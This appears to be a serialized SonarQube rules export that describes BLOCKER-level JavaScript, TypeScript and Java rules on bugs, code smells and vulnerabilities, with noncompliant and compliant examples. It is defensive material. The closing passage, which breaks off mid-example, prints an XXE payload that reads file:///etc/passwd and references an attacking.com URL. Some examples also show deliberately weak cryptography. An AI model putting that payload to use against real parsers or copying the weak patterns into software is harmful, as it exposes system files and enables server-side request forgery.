javascriptS3516(Function returns should not be invariant"BLOCKER*js:Ù<p>When a function is designed to return an invariant value, it may be poor design, but it shouldn't adversely affect the outcome of your program.
However, when it happens on all paths through the logic, it is likely a mistake.</p>
<p>This rule raises an issue when a function contains several <code>return</code> statements that all return the same value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(a) {  // Noncompliant
  let b = 12;
  if (a) {
    return b;
  }
  return b;
}
</pre>Z
CODE_SMELL
Ö
#javascript:NonEmptyCaseWithoutBreak›

javascriptNonEmptyCaseWithoutBreak?Switch cases should end with an unconditional "break" statement"BLOCKER*js:⁄<p>When the execution is not explicitly terminated at the end of a switch case, it continues to execute the statements of the following case. While
this is sometimes intentional, it often is a mistake which leads to unexpected behavior. </p>
<h2>Noncompliant Code Example</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:  // Both 'doSomething()' and 'doSomethingElse()' will be executed. Is it on purpose ?
    doSomething();
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
switch (myVariable) {
  case 1:
    foo();
    break;
  case 2:
    doSomething();
    break;
  default:
    doSomethingElse();
    break;
}
</pre>
<h2>Exceptions</h2>
<p>This rule is relaxed in the following cases:</p>
<pre>
switch (myVariable) {
  case 0:                                // Empty case used to specify the same behavior for a group of cases.
  case 1:
    doSomething();
    break;
  case 2:                                // Use of return statement
    return;
  case 3:                               // Ends with comment when fall-through is intentional
    console.log("this case falls through")
    // fall through
  case 4:                                // Use of throw statement
    throw new IllegalStateException();
  case 5:                                // Use of continue statement
    continue;
  default:                               // For the last case, use of break statement is optional
    doSomethingElse();
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/484.html">MITRE, CWE-484</a> - Omitted Break Statement in Switch </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/YIFLAQ">CERT, MSC17-C.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ewHAAQ">CERT, MSC52-J.</a> - Finish every set of statements associated with a case
  label with a break statement </li>
</ul>Z
CODE_SMELL
Ì
javascript:S3509ÿ

javascriptS35090Default parameters should not cause side effects"BLOCKER*js:˜<p>The assignment of default parameter values is generally intended to help the caller. But when a default assignment causes side effects, the caller
may not be aware of the extra changes or may not fully understand their implications. I.e. default assignments with side effects may end up hurting
the caller, and for that reason, they should be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var count = 0;

function go(i = count++) {  // Noncompliant
  console.log(i);
}

go();  // outputs 0
go(7); // outputs 7
go();  // outputs 1
</pre>
<h2>Deprecated</h2>
<p>This rule is deprecated, and will eventually be removed.</p>Z
CODE_SMELL
Ì
typescript:S1526ÿ

typescriptS1526EVariables declared with "var" should be declared before they are used"BLOCKER*ts:‚<p>Variables declared with <code>var</code> have the special property that regardless of where they're declared in a function they "float" to the top
of the function and are available for use even before they're declared. That makes scoping confusing, especially for new coders. </p>
<p>To keep confusion to a minimum, <code>var</code> declarations should happen before they are used for the first time.</p>
<h2>Noncompliant Code Example</h2>
<pre>
var x = 1;

function fun(){
  alert(x); // Noncompliant as x is declared later in the same scope
  if(something) {
    var x = 42; // Declaration in function scope (not block scope!) shadows global variable
  }
}

fun(); // Unexpectedly alerts "undefined" instead of "1"
</pre>
<h2>Compliant Solution</h2>
<pre>
var x = 1;

function fun() {
  print(x);
  if (something) {
    x = 42;
  }
}

fun(); // Print "1"
</pre>Z
CODE_SMELL
˝	
typescript:S1451Ë	

typescriptS1451+Track lack of copyright and license headers"BLOCKER*ts:å	<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>Z
CODE_SMELL
‚
typescript:S3516Õ

typescriptS3516(Function returns should not be invariant"BLOCKER*ts:Ù<p>When a function is designed to return an invariant value, it may be poor design, but it shouldn't adversely affect the outcome of your program.
However, when it happens on all paths through the logic, it is likely a mistake.</p>
<p>This rule raises an issue when a function contains several <code>return</code> statements that all return the same value.</p>
<h2>Noncompliant Code Example</h2>
<pre>
function foo(a) {  // Noncompliant
  let b = 12;
  if (a) {
    return b;
  }
  return b;
}
</pre>Z
CODE_SMELL
¬

java:S2229≥
javaS2229TMethods should not call same-class methods with incompatible "@Transactional" values"BLOCKER*java:π<p>When using Spring proxies, calling a method in the same class (e.g. <code>this.aMethod()</code>) with an incompatible <code>@Transactional</code>
requirement will result in runtime exceptions because Spring only "sees" the caller and makes no provisions for properly invoking the callee. </p>
<p>Therefore, certain calls should never be made within the same class:</p>
<table>
  <tbody>
    <tr>
      <th>From</th>
      <th>To</th>
    </tr>
    <tr>
      <td> non-<code>@Transactional</code> </td>
      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> MANDATORY </td>
      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> NESTED </td>
      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> NEVER </td>
      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> NOT_SUPPORTED </td>
      <td> MANDATORY, NESTED, REQUIRED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> REQUIRED or <code>@Transactional</code> </td>
      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> REQUIRES_NEW </td>
      <td> NESTED, NEVER, NOT_SUPPORTED, REQUIRES_NEW </td>
    </tr>
    <tr>
      <td> SUPPORTS </td>
      <td> MANDATORY, NESTED, NEVER, NOT_SUPPORTED, REQUIRED, REQUIRES_NEW </td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>

@Override
public void doTheThing() {
  // ...
  actuallyDoTheThing();  // Noncompliant
}

@Override
@Transactional
public void actuallyDoTheThing() {
  // ...
}
</pre>ZBUG
¯

java:S2115È
javaS2115&Databases should be password-protected"BLOCKER*java:ì<p>Databases should always be password protected. The use of a database connection with an empty password is a clear indication of a database that is
not protected.</p>
<p>This rule flags database connections with empty passwords.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Connection conn = DriverManager.getConnection("jdbc:derby:memory:myDB;create=true", "AppLogin", "");
Connection conn2 = DriverManager.getConnection("jdbc:derby:memory:myDB;create=true?user=user&amp;password=");
</pre>
<h2>Compliant Solution</h2>
<pre>
DriverManager.getConnection("jdbc:derby:memory:myDB;create=true?user=user&amp;password=password");

DriverManager.getConnection("jdbc:mysql://address=(host=myhost1)(port=1111)(key1=value1)(user=sandy)(password=secret),address=(host=myhost2)(port=2222)(key2=value2)(user=sandy)(password=secret)/db");

DriverManager.getConnection("jdbc:mysql://sandy:secret@[myhost1:1111,myhost2:2222]/db");

String url = "jdbc:postgresql://localhost/test";
Properties props = new Properties();
props.setProperty("user", "fred");
props.setProperty("password", "secret");
DriverManager.getConnection(url, props);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/521.html">MITRE, CWE-521</a> - Weak Password Requirements </li>
</ul>ZVULNERABILITY
ò

java:S2236â
javaS2236ZMethods "wait(...)", "notify()" and "notifyAll()" should not be called on Thread instances"BLOCKER*java:â<p>The methods <code>wait(...)</code>, <code>notify()</code> and <code>notifyAll()</code> are available on a <code>Thread</code> instance, but only
because all classes in Java extend <code>Object</code> and therefore automatically inherit those methods. But there are two very good reasons for not
calling them on a <code>Thread</code>:</p>
<ul>
  <li> Internally, the JVM relies on these methods to change the state of the Thread (<code>BLOCKED</code>, <code>WAITING</code>, ...), so calling
  them will corrupt the behavior of the JVM. </li>
  <li> It is not clear (perhaps even to the original coder) what is really expected. For instance, it is waiting for the execution of the Thread to
  suspended, or is it the acquisition of the object monitor that is waited for? </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Thread myThread = new Thread(new RunnableJob());
...
myThread.wait(2000);
</pre>ZBUG
⁄

java:S1147À
javaS1147!Exit methods should not be called"BLOCKER*java:˝<p>Calling <code>System.exit(int status)</code> or <code>Rutime.getRuntime().exit(int status)</code> calls the shutdown hooks and shuts downs the
entire Java virtual machine. Calling <code>Runtime.getRuntime().halt(int)</code> does an immediate shutdown, without calling the shutdown hooks, and
skipping finalization.</p>
<p>Each of these methods should be used with extreme care, and only when the intent is to stop the whole Java process. For instance, none of them
should be called from applications running in a J2EE container.</p>
<h2>Noncompliant Code Example</h2>
<pre>
System.exit(0);
Runtime.getRuntime().exit(0);
Runtime.getRuntime().halt(0);
</pre>
<h2>Exceptions</h2>
<p>These methods are ignored inside <code>main</code>.</p>
<h2>See</h2>
<ul>
  <li> <a href="http://cwe.mitre.org/data/definitions/382.html">MITRE, CWE-382</a> - Use of System.exit() </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/PoYbAQ">CERT, ERR09-J.</a> - Do not allow untrusted code to terminate the JVM </li>
</ul>Z
CODE_SMELL
 

java:S2689ª
javaS2689FFiles opened in append mode should not be used with ObjectOutputStream"BLOCKER*java:œ<p><code>ObjectOutputStream</code>s are used with serialization, and the first thing an <code>ObjectOutputStream</code> writes is the serialization
stream header. This header should appear once per file, at the beginning. Pass a file opened in append mode into an <code>ObjectOutputStream</code>
constructor and the serialization stream header will be added to the end of the file before your object is then also appended.</p>
<p>When you're trying to read your object(s) back from the file, only the first one will be read successfully, and a
<code>StreamCorruptedException</code> will be thrown after that.</p>
<h2>Noncompliant Code Example</h2>
<pre>
FileOutputStream fos = new FileOutputStream (fileName , true);  // fos opened in append mode
ObjectOutputStream out = new ObjectOutputStream(fos);  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
FileOutputStream fos = new FileOutputStream (fileName);
ObjectOutputStream out = new ObjectOutputStream(fos);
</pre>ZBUG
ñ

java:S2699á
javaS2699Tests should include assertions"BLOCKER*java:ª<p>A test case without assertions ensures only that no exceptions are thrown. Beyond basic runnability, it ensures nothing about the behavior of the
code under test.</p>
<p>This rule raises an exception when no assertions from any of the following known frameworks are found in a test:</p>
<ul>
  <li> JUnit </li>
  <li> Fest 1.x </li>
  <li> Fest 2.x </li>
  <li> Rest-assured 2.0 </li>
  <li> AssertJ </li>
  <li> Hamcrest </li>
  <li> Spring's <code>org.springframework.test.web.servlet.ResultActions.andExpect()</code> </li>
  <li> Eclipse Vert.x </li>
  <li> Truth Framework </li>
  <li> Mockito </li>
  <li> EasyMock </li>
  <li> JMock </li>
  <li> WireMock </li>
  <li> RxJava 1.x </li>
  <li> RxJava 2.x </li>
  <li> Selenide </li>
  <li> JMockit </li>
</ul>
<p>Furthermore, as new or custom assertion frameworks may be used, the rule can be parametrized to define specific methods that will also be
considered as assertions. No issue will be raised when such methods are found in test cases. The parameter value should have the following format
<code>&lt;FullyQualifiedClassName&gt;#&lt;MethodName&gt;</code>, where <code>MethodName</code> can end with the wildcard character. For constructors,
the pattern should be <code>&lt;FullyQualifiedClassName&gt;#&lt;init&gt;</code>.</p>
<p>Example:&nbsp;<code>com.company.CompareToTester#compare*,com.company.CustomAssert#customAssertMethod,com.company.CheckVerifier#&lt;init&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
@Test
public void testDoSomething() {  // Noncompliant
  MyClass myClass = new MyClass();
  myClass.doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<p>Example when <code>com.company.CompareToTester#compare*</code> is used as parameter to the rule.</p>
<pre>
import com.company.CompareToTester;

@Test
public void testDoSomething() {
  MyClass myClass = new MyClass();
  assertNull(myClass.doSomething());  // JUnit assertion
  assertThat(myClass.doSomething()).isNull();  // Fest assertion
}

@Test
public void testDoSomethingElse() {
  MyClass myClass = new MyClass();
  new CompareToTester().compareWith(myClass);  // Compliant - custom assertion method defined as rule parameter
  CompareToTester.compareStatic(myClass);  // Compliant
}
</pre>Z
CODE_SMELL
í

java:S3546É
javaS3546!Custom resources should be closed"BLOCKER*java:∫<p>Leaking resources in an application is never a good idea, as it can lead to memory issues, and even the crash of the application. This rule
template allows you to specify which constructions open a resource and how it is closed in order to raise issue within a method scope when custom
resources are leaked.</p>
<h2>See also</h2>
<ul>
  <li> <a href='/coding_rules#rule_key=squid%3AS2095'>S2095</a> - Resources should be closed </li>
</ul>@ZBUG
Â

java:S2695÷
javaS2695O"PreparedStatement" and "ResultSet" methods should be called with valid indices"BLOCKER*java:·<p>The parameters in a <code>PreparedStatement</code> are numbered from 1, not 0, so using any "set" method of a <code>PreparedStatement</code> with a
number less than 1 is a bug, as is using an index higher than the number of parameters. Similarly, <code>ResultSet</code> indices also start at 1,
rather than 0</p>
<h2>Noncompliant Code Example</h2>
<pre>
PreparedStatement ps = con.prepareStatement("SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?");
ps.setDate(0, date);  // Noncompliant
ps.setDouble(3, salary);  // Noncompliant

ResultSet rs = ps.executeQuery();
while (rs.next()) {
  String fname = rs.getString(0);  // Noncompliant
  // ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
PreparedStatement ps = con.prepareStatement("SELECT fname, lname FROM employees where hireDate &gt; ? and salary &lt; ?");
ps.setDate(1, date);
ps.setDouble(2, salary);

ResultSet rs = ps.executeQuery();
while (rs.next()) {
  String fname = rs.getString(1);
  // ...
}
</pre>ZBUG
¸

java:S2693Ì
javaS2693-Threads should not be started in constructors"BLOCKER*java:ì<p>The problem with invoking <code>Thread.start()</code> in a constructor is that you'll have a confusing mess on your hands if the class is ever
extended because the superclass' constructor will start the thread before the child class has truly been initialized.</p>
<p>This rule raises an issue any time <code>start</code> is invoked in the constructor of a non-<code>final</code> class.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public class MyClass {

  Thread thread = null;

  public MyClass(Runnable runnable) {
    thread = new Thread(runnable);
    thread.start(); // Noncompliant
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/ZQIRAg">CERT, TSM02-J.</a> - Do not use background threads during class initialization
  </li>
</ul>Z
CODE_SMELL
Ë	

java:S2387Ÿ	
javaS23878Child class fields should not shadow parent class fields"BLOCKER*java:Ù<p>Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy and you'll get confusion at
best, chaos at worst. </p>
<h2>Noncompliant Code Example</h2>
<pre>
public class Fruit {
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry extends Fruit {
  private boolean ripe;  // Noncompliant
  private static Color FLESH; // Noncompliant
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public class Fruit {
  protected Season ripe;
  protected Color flesh;

  // ...
}

public class Raspberry extends Fruit {
  private boolean ripened;
  private static Color FLESH_COLOR;

}
</pre>
<h2>Exceptions</h2>
<p>This rule ignores same-name fields that are <code>static</code> in both the parent and child classes. This rule ignores <code>private</code> parent
class fields, but in all other such cases, the child class field should be renamed.</p>
<pre>
public class Fruit {
  private Season ripe;
  // ...
}

public class Raspberry extends Fruit {
  private Season ripe;  // Compliant as parent field 'ripe' is anyway not visible from Raspberry
  // ...
}
</pre>Z
CODE_SMELL
œ

java:S3369¿
javaS3369&Security constraints should be defined"BLOCKER*java:Í<p>Websphere, Tomcat, and JBoss web servers allow the definition of role-based access to servlets. It may not be granular enough for your purposes,
but it's a start, and should be used at least as a base.</p>
<p>This rule raises an issue when a <em>web.xml</em> file has no <code>&lt;security-constraint&gt;</code> elements.</p>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A5-Broken_Access_Control">OWASP Top 10 2017 Category A5</a> - Broken Access Control </li>
  <li> <a href="https://cwe.mitre.org/data/definitions/284.html">MITRE, CWE-284</a> - Improper Access Control </li>
</ul>ZVULNERABILITY
ˆ

java:S2278Á
javaS2278GNeither DES (Data Encryption Standard) nor DESede (3DES) should be used"BLOCKER*java:<p>According to the US National Institute of Standards and Technology (NIST), the Data Encryption Standard (DES) is no longer considered secure:</p>
<blockquote>
  <p>Adopted in 1977 for federal agencies to use in protecting sensitive, unclassified information, the DES is being withdrawn because it no longer
  provides the security that is needed to protect federal government information.</p>
  <p>Federal agencies are encouraged to use the Advanced Encryption Standard, a faster and stronger algorithm approved as FIPS 197 in 2001.</p>
</blockquote>
<p>For similar reasons, RC2 should also be avoided.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Cipher c = Cipher.getInstance("DESede/ECB/PKCS5Padding");
</pre>
<h2>Compliant Solution</h2>
<pre>
Cipher c = Cipher.getInstance("AES/GCM/NoPadding");
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/VwAZAg">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
  <li> Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#DES_USAGE">DES / DESede Unsafe</a> </li>
</ul>ZVULNERABILITY
ä

java:S2276˚
javaS2276M"wait(...)" should be used instead of "Thread.sleep(...)" when a lock is held"BLOCKER*java:à<p>If <code>Thread.sleep(...)</code> is called when the current thread holds a lock, it could lead to performance and scalability issues, or even
worse to deadlocks because the execution of the thread holding the lock is frozen. It's better to call <code>wait(...)</code> on the monitor object to
temporarily release the lock and allow other threads to run.</p>
<h2>Noncompliant Code Example</h2>
<pre>
public void doSomething(){
  synchronized(monitor) {
    while(notReady()){
      Thread.sleep(200);
    }
    process();
  }
  ...
}
</pre>
<h2>Compliant Solution</h2>
<pre>
public void doSomething(){
  synchronized(monitor) {
    while(notReady()){
      monitor.wait(200);
    }
    process();
  }
  ...
}
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/FgG7AQ">CERT, LCK09-J.</a> - Do not perform operations that can block while holding a
  lock </li>
</ul>ZBUG
º

java:S2275≠
javaS2275MPrintf-style format strings should not lead to unexpected behavior at runtime"BLOCKER*java:∫<p>Because <code>printf</code>-style format strings are interpreted at runtime, rather than validated by the Java compiler, they can contain errors
that lead to unexpected behavior or runtime errors. This rule statically validates the good behavior of <code>printf</code>-style formats when calling
the <code>format(...)</code> methods of <code>java.util.Formatter</code>, <code>java.lang.String</code>, <code>java.io.PrintStream</code>,
<code>MessageFormat</code>, and <code>java.io.PrintWriter</code> classes and the <code>printf(...)</code> methods of <code>java.io.PrintStream</code>
or <code>java.io.PrintWriter</code> classes. </p>
<h2>Noncompliant Code Example</h2>
<pre>
String.format("The value of my integer is %d", "Hello World");  // Noncompliant; an 'int' is expected rather than a String
String.format("Duke's Birthday year is %tX", c);  //Noncompliant; X is not a supported time conversion character
String.format("Display %0$d and then %d", 1);   //Noncompliant; arguments are numbered starting from 1
String.format("Not enough arguments %d and %d", 1);  //Noncompliant; the second argument is missing
String.format("%&lt; is equals to %d", 2);   //Noncompliant; the argument index '&lt;' refers to the previous format specifier but there isn't one

MessageFormat.format("Result {1}.", value); // Noncompliant; Not enough arguments. (first element is {0})
MessageFormat.format("Result {{0}.", value); // Noncompliant; Unbalanced number of curly brace (single curly braces should be escaped)
MessageFormat.format("Result ' {0}", value); // Noncompliant; Unbalanced number of quotes (single quote must be escaped)

java.util.logging.Logger logger;
logger.log(java.util.logging.Level.SEVERE, "Result {1}!", 14); // Noncompliant - Not enough arguments.

org.slf4j.Logger slf4jLog;
org.slf4j.Marker marker;

slf4jLog.debug(marker, "message {}"); // Noncompliant - Not enough arguments.

org.apache.logging.log4j.Logger log4jLog;
log4jLog.debug("message {}"); // Noncompliant - Not enough arguments.
</pre>
<h2>Compliant Solution</h2>
<pre>
String.format("The value of my integer is %d", 3);
String.format("Duke's Birthday year is %tY", c);
String.format("Display %1$d and then %d", 1);
String.format("Not enough arguments %d and %d", 1, 2);
String.format("%d is equals to %&lt;", 2);

MessageFormat.format("Result {0}.", value);
MessageFormat.format("Result {0} &amp; {1}.", value, value);
MessageFormat.format("Result {0}.", myObject);

java.util.logging.Logger logger;
logger.log(java.util.logging.Level.SEVERE, "Result {1},{2}!", 14, 2);

org.slf4j.Logger slf4jLog;
org.slf4j.Marker marker;

slf4jLog.debug(marker, "message {}", 1);

org.apache.logging.log4j.Logger log4jLog;
log4jLog.debug("message {}", 1);
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.securecoding.cert.org/confluence/x/wQA1">CERT, FIO47-C.</a> - Use valid format strings </li>
</ul>ZBUG
˙

java:S2391Î
javaS23913JUnit framework methods should be declared properly"BLOCKER*java:ã<p>If the <code>suite</code> method in a JUnit 3 <code>TestCase</code> is not declared correctly, it will not be used. Such a method must be named
"suite", have no arguments, be <code>public static</code>, and must return either a <code>junit.framework.Test</code> or a
<code>junit.framework.TestSuite</code>.</p>
<p>Similarly, <code>setUp</code> and <code>tearDown</code> methods that aren't properly capitalized will also be ignored.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Test suite() { ... }  // Noncompliant; must be public static
public static boolean suite() { ... }  // Noncompliant; wrong return type
public static Test suit() { ... }  // Noncompliant; typo in method name
public static Test suite(int count) { ... } // Noncompliant; must be no-arg

public void setup() { ... } // Noncompliant; should be setUp
public void tearDwon() { ... }  // Noncompliant; should be tearDown
</pre>
<h2>Compliant Solution</h2>
<pre>
public static Test suite() { ... }
public void setUp() { ... }
public void tearDown() { ... }
</pre>Z
CODE_SMELL
¥

java:S4426•
javaS4426#Cryptographic keys should be robust"BLOCKER*java:“<p>Most of cryptographic systems require a sufficient key size to be robust against brute-force attacks.</p>
<p><a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST recommendations</a> will be checked:</p>
<table>
  <tbody>
    <tr>
      <th>Use / Algorithm</th>
      <th>DSA</th>
      <th>RSA</th>
      <th>ECDSA</th>
      <th>DH</th>
      <th>MQV</th>
      <th>ECDH</th>
      <th>ECMQV</th>
      <th>Block Cipher</th>
    </tr>
    <tr>
      <td>Digital Signature Generation </td>
      <td> p ‚â• 2048 AND q ‚â• 224</td>
      <td>n ‚â• 2048</td>
      <td>See table below </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x <br></td>
      <td>Digital Signature Verification </td>
      <td> p ‚â• 2048 AND q ‚â• 224</td>
      <td>n ‚â• 2048</td>
      <td>See table below </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x <br></td>
      <td>Key Agreement </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> p ‚â• 2048 AND q ‚â• 224 </td>
      <td> p ‚â• 2048 AND q ‚â• 224 </td>
      <td> See table below </td>
      <td> See table below </td>
      <td> x <br></td>
      <td> Encryption and Decryption </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> x </td>
      <td> AES-128, 192, 256<br><br>This rule will not raise issues for ciphers that are considered weak (no matter the key size) like
      <code>DES</code>, <code>Blowfish</code>.<br><br>h3. Notation<br>* DSA ([Digital Signature Algorithm</td>
      <td>https://en.wikipedia.org/wiki/Digital_Signature_Algorithm]): <code>p</code> is key length and <code>q</code> the modulus length<br>* EC
      ([Elliptic-curve</td>
      <td>https://en.wikipedia.org/wiki/Elliptic-curve_cryptography])<br></td>
      <td></td>
      <td>EC parameters</td>
      <td></td>
      <td>EB</td>
      <td></td>
      <td>EC</td>
      <td></td>
      <td>ED</td>
      <td></td>
      <td>EE</td>
      <td></td>
    </tr>
    <tr>
      <td> Length of n </td>
      <td> 224-255 </td>
      <td> 256-383 </td>
      <td> 384-511 </td>
      <td> 512+<br></td>
      <td> Maximum bit length of cofactor h </td>
      <td> 14 </td>
      <td> 16 </td>
      <td> 24 </td>
    </tr>
  </tbody>
</table>
<h2>Noncompliant Code Example</h2>
<pre>
KeyPairGenerator keyPairGen1 = KeyPairGenerator.getInstance("RSA");
keyPairGen1.initialize(1024); // Noncompliant

KeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance("EC");
ECGenParameterSpec ecSpec1 = new ECGenParameterSpec("secp112r1"); // Noncompliant
keyPairGen5.initialize(ecSpec1);

KeyGenerator keyGen1 = KeyGenerator.getInstance("AES");
keyGen1.init(64); // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
KeyPairGenerator keyPairGen6 = KeyPairGenerator.getInstance("RSA");
keyPairGen6.initialize(2048); // Compliant

KeyPairGenerator keyPairGen5 = KeyPairGenerator.getInstance("EC");
ECGenParameterSpec ecSpec10 = new ECGenParameterSpec("secp224k1"); // compliant
keyPairGen5.initialize(ecSpec10);

KeyGenerator keyGen2 = KeyGenerator.getInstance("AES");
keyGen2.init(128); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure
  </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A9</a> - Security
  Misconfiguration </li>
  <li> <a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-131Ar1.pdf">NIST 800-131A</a> - Recommendation for Transitioning the
  Use of Cryptographic Algorithms and Key Lengths </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/326.html">MITRE, CWE-326</a> - Inadequate Encryption Strength </li>
</ul>ZVULNERABILITY
≥

java:S2258§
javaS2258L"javax.crypto.NullCipher" should not be used for anything other than testing"BLOCKER*java:®<p>By contract, the <code>NullCipher</code> class provides an "identity cipher" <del></del> one that does not transform or encrypt the plaintext in
any way. As a consequence, the ciphertext is identical to the plaintext. So this class should be used for testing, and never in production code.</p>
<h2>Noncompliant Code Example</h2>
<pre>
NullCipher nc = new NullCipher();
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration">OWASP Top 10 2017 Category A6</a> - Security
  Misconfiguration </li>
  <li> <a href="http://cwe.mitre.org/data/definitions/327.html">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>
  <li> <a href="https://www.sans.org/top25-software-errors/#cat3">SANS Top 25</a> - Porous Defenses </li>
</ul>ZVULNERABILITY
’

java:S4434∆
javaS4434'LDAP deserialization should be disabled"BLOCKER*java:Ô
<p>JNDI supports the deserialization of objects from LDAP directories, which is fundamentally insecure and can lead to remote code execution.</p>
<p>This rule raises an issue when an LDAP search query is executed with <code>SearchControls</code> configured to allow deserialization.</p>
<h2>Noncompliant Code Example</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            true, // Noncompliant; allows deserialization
            deref));
</pre>
<h2>Compliant Solution</h2>
<pre>
DirContext ctx = new InitialDirContext();
// ...
ctx.search(query, filter,
        new SearchControls(scope, countLimit, timeLimit, attributes,
            false,
            deref));
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://cwe.mitre.org/data/definitions/502.html">MITRE, CWE-502</a> - Deserialization of Untrusted Data </li>
  <li> <a href="https://www.owasp.org/index.php/Top_10-2017_A8-Insecure_Deserialization">OWASP Top 10 2017 Category A8</a> - Insecure Deserialization
  </li>
  <li> <a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf">BlackHat
  presentation</a> </li>
  <li> Derived from FindSecBugs rule <a href="https://find-sec-bugs.github.io/bugs.htm#LDAP_ENTRY_POISONING">LDAP_ENTRY_POISONING</a> </li>
</ul>ZVULNERABILITY
øM

java:S2755∞M
javaS27553XML parsers should not be vulnerable to XXE attacks"BLOCKER*java:ÕL<p>Allowing access to external entities in XML Parsing could introduce vulnerabilities like SSRF or confidential file disclosures:</p>
<p>Example in XML document:</p>
<pre>
&lt;?xml version="1.0" encoding="utf-8"?&gt;
  &lt;!DOCTYPE test [
    &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
  ]&gt;
&lt;note xmlns="http://www.w3schools.com" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.attacking.com/deleteall"&gt;
  &lt;to&gt;&amp;xxe;&lt;/to&gt;
  &lt;from&gt;Jani&lt;/from&gt;
